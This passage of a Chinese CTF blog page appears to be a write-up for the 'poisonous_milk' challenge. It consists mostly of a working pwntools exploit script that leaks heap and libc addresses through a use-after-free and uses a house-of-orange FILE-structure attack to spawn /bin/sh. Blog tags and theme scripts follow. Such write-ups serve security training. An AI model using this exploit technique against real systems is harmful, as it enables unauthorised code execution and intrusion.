class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./poisonous_milk&#x27;</span>)  </span><br><span class="line"><span class="comment">#sh = remote(&#x27;111.198.29.45&#x27;,35825)  </span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)  </span><br><span class="line">malloc_hook_s = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]  </span><br><span class="line">_IO_list_all_s = libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]  </span><br><span class="line">system_s = libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">payload</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;p&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input your flags (0-99):&#x27;</span>,payload)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&quot;Input your milk&#x27;s color:&quot;</span>,<span class="string">&quot;&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Give the index :&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;v&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drink</span>():  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;d&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#创建一个0x20的头结构体加0x20的存储flags的堆，这样，两个堆释放和属于同一个fastbin，并且头结构体作为头，因为后释放  </span></span><br><span class="line">create(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>-<span class="number">1</span>))  </span><br><span class="line">delete(<span class="number">0</span>)  </span><br><span class="line"><span class="comment">#接下来重新申请堆，之前的节点结构体内保存着指针，由于flags堆先申请，所以我们不能申请和之前大小一样的  </span></span><br><span class="line"><span class="comment">#因为我们要让我们这个节点的结构体申请到前一个释放后的节点的结构体内存位置处  </span></span><br><span class="line">create(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)  </span><br><span class="line"><span class="comment">#泄露堆地址  </span></span><br><span class="line">show()  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;[0] [&#x27;</span>)  </span><br><span class="line">heap_addr = u64(sh.recvuntil(<span class="string">&#x27;]&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line">heap_base = heap_addr - <span class="number">0xC88</span>  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;heap_base=&#x27;</span>,<span class="built_in">hex</span>(heap_base)  </span><br><span class="line"><span class="comment">#释放了所有的堆，以及vector对象本身  </span></span><br><span class="line">drink()  </span><br><span class="line"><span class="comment">#重新申请到了vector的内存空间，UAF控制vector的begin和end指针  </span></span><br><span class="line">create(p64(heap_base + <span class="number">0xE50</span>) + p64(heap_base + <span class="number">0xE58</span>))  </span><br><span class="line"><span class="comment">#这里是用来创建0x20大小的堆，放入fastbin，给以后申请用，这样申请节点结构体时，就不会从我们辛苦得到的unsorted bin里切割  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):  </span><br><span class="line">   create(<span class="string">&#x27;g&#x27;</span>*<span class="number">0x9</span>) <span class="comment">#index 2~3  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">1</span>,-<span class="number">1</span>):  </span><br><span class="line">   delete(i)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#==============为了得到unsorted bin的chunk，我们伪造三个chunk===========  </span></span><br><span class="line"><span class="comment">#伪造节点结构体  </span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)  </span><br><span class="line"><span class="comment">#color_ptr          #flags_ptr  </span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(heap_base+<span class="number">0xCD0</span>)  </span><br><span class="line"><span class="comment">#伪造flags堆  </span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)  </span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)  </span><br><span class="line">create(payload) <span class="comment">#index2  </span></span><br><span class="line">  </span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>  </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)  </span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,<span class="string">&#x27;b&#x27;</span>)  </span><br><span class="line">create(payload) <span class="comment">#index3  </span></span><br><span class="line"><span class="comment">#payload = &#x27;c&#x27;*0x10  </span></span><br><span class="line"><span class="comment">#在后面继续伪造两个堆，绕过堆检查  </span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)  </span><br><span class="line">payload += <span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>  </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)  </span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,<span class="string">&#x27;c&#x27;</span>)  </span><br><span class="line">create(payload) <span class="comment">#2  </span></span><br><span class="line"><span class="comment">#==================================================================  </span></span><br><span class="line"><span class="comment">#这个堆，我们用来伪造vector的每一项的指针item*，通过控制item*指针，我们就对对需要的节点进行操作  </span></span><br><span class="line"><span class="comment">#伪造item指针  </span></span><br><span class="line"><span class="comment">#0  </span></span><br><span class="line">payload = p64(heap_base+<span class="number">0xCB0</span>) <span class="comment">#fake_chunk node  </span></span><br><span class="line"><span class="comment">#1  </span></span><br><span class="line">payload += p64(heap_base+<span class="number">0xCB0</span>) <span class="comment">#fake_chunk node  </span></span><br><span class="line"><span class="comment">#2  </span></span><br><span class="line">payload += p64(heap_base+<span class="number">0xC60</span>) <span class="comment">#aaaaaaaaaa node  </span></span><br><span class="line">payload += p64(heap_base+<span class="number">0xD10</span>)   <span class="comment">#bbbbbbbbb node  </span></span><br><span class="line">payload += p64(heap_base+<span class="number">0xD70</span>)   <span class="comment">#ccccccccc node  </span></span><br><span class="line">payload += p64(heap_base+<span class="number">0xD10</span>)   <span class="comment">#  </span></span><br><span class="line">payload += p64(heap_base+<span class="number">0xD70</span>)     <span class="comment">#  </span></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,<span class="string">&#x27;c&#x27;</span>)  </span><br><span class="line">create(payload) <span class="comment">#5  </span></span><br><span class="line">  </span><br><span class="line">delete(<span class="number">0</span>)  </span><br><span class="line"><span class="comment">#泄露main_arena+88地址  </span></span><br><span class="line">show()  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;]&#x27;</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;] &#x27;</span>)  </span><br><span class="line">main_arena_88 = u64(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line">malloc_hook_addr = (main_arena_88 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + (malloc_hook_s &amp; <span class="number">0xFFF</span>)  </span><br><span class="line">libc_base = malloc_hook_addr - malloc_hook_s  </span><br><span class="line">_IO_list_all_addr = libc_base + _IO_list_all_s  </span><br><span class="line">libc_base = _IO_list_all_addr - _IO_list_all_s  </span><br><span class="line">system_addr = libc_base + system_s  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;_IO_list_all_addr=&#x27;</span>,<span class="built_in">hex</span>(_IO_list_all_addr)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)  </span><br><span class="line"><span class="comment">#fastbin与我们伪造生成的unsorted bin重合！！  </span></span><br><span class="line">delete(<span class="number">3</span>)  </span><br><span class="line">delete(<span class="number">2</span>)  </span><br><span class="line">delete(<span class="number">1</span>)  </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;#执行vtable的函数时，FILE结构体地址被作为参数，因此，我们在最开头写/bin/sh字符串 </span></span><br><span class="line"><span class="string">fake_file = &#x27;/bin/sh\x00&#x27; + p64(0x60) #size作为0x60，被放入small_bin，从而对应了chain指针 </span></span><br><span class="line"><span class="string">#unsorted bin attack，修改_IO_list_all为main_arena+88 </span></span><br><span class="line"><span class="string">fake_file += p64(0) + p64(_IO_list_all_addr-0x10) </span></span><br><span class="line"><span class="string">#_IO_write_base &lt; _IO_write_ptr </span></span><br><span class="line"><span class="string">fake_file += p64(0) + p64(1) </span></span><br><span class="line"><span class="string">fake_file = fake_file.ljust(0xC0,&#x27;\x00&#x27;) </span></span><br><span class="line"><span class="string">fake_file += p64(0)*3 </span></span><br><span class="line"><span class="string">#vtable指针,同时，也作为fake_vtable的__dummy </span></span><br><span class="line"><span class="string">fake_file += p64(heap_base + 0x5E8) </span></span><br><span class="line"><span class="string">#__dummy2、__finish </span></span><br><span class="line"><span class="string">fake_file += p64(0)*2 </span></span><br><span class="line"><span class="string">#__overflow </span></span><br><span class="line"><span class="string">fake_file += p64(system_addr) </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>  </span><br><span class="line"><span class="comment">#house of orange  </span></span><br><span class="line"><span class="comment">#fake分成2部分，写入  </span></span><br><span class="line"><span class="comment">#执行vtable的函数时，FILE结构体地址被作为参数，因此，我们在最开头写/bin/sh字符串  </span></span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x60</span>) <span class="comment">#size作为0x60，被放入small_bin，从而对应了chain指针  </span></span><br><span class="line"><span class="comment">#unsorted bin attack，修改_IO_list_all为main_arena+88  </span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all_addr-<span class="number">0x10</span>)  </span><br><span class="line"><span class="comment">#_IO_write_base &lt; _IO_write_ptr  </span></span><br><span class="line"><span class="comment">#fake_file += p64(0) + p64(1)  </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + fake_file  </span><br><span class="line">create(payload.ljust(<span class="number">0x40</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="comment">#第二部分  </span></span><br><span class="line"><span class="comment">##vtable指针,同时，也作为fake_vtable的__dummy  </span></span><br><span class="line">fake_file = p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0xD98</span>)  </span><br><span class="line"><span class="comment">#__dummy2、__finish  </span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">2</span>  </span><br><span class="line"><span class="comment">#__overflow  </span></span><br><span class="line">fake_file += p64(system_addr)  </span><br><span class="line">create(fake_file.ljust(<span class="number">0x50</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#getshell  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;p&#x27;</span>)  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Input your flags (0-99):&#x27;</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x40</span>)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/UAF/" rel="tag"># UAF</a>
+              <a href="/ha1vk/tags/C-vector/" rel="tag"># C++ vector</a>
+              <a href="/ha1vk/tags/fastbin/" rel="tag"># fastbin</a>
+              <a href="/ha1vk/tags/%E6%9C%AA%E5%88%9D%E5%A7%8B%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="tag"># 未初始化漏洞</a>
+              <a href="/ha1vk/tags/house-of-orange/" rel="tag"># house of orange</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/02/19/bufoverflow_b/" rel="prev" title="bufoverflow_b">
+      <i class="fa fa-chevron-left"></i> bufoverflow_b
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/02/20/shellcode_enc/" rel="next" title="Shellcode加密原理之自己动手写加密器">
+      Shellcode加密原理之自己动手写加密器 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
